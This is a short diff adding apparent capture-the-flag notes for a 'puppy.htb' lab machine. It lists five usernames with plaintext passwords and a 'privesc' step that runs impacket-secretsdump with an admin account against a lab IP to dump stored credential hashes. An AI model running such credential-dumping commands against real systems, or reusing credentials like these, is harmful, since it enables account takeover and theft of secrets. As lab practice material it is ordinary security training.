@@ -1,0 +1,11 @@
+creds
+	levi.james : 'KingofAkron2025!'
+	ant.edwards : 'Antman2025!'
+	adam.silver : 'Password@123'
+	steph.copper : 'ChefSteph2025!'
+	steph.cooper_adm  : 'FivethChipOnItsWay2025!'
+	
+privesc 
+
+	impacket-secretsdump puppy.htb/steph.cooper_adm:'FivethChipOnItsWay2025!'@10.129.158.58
+
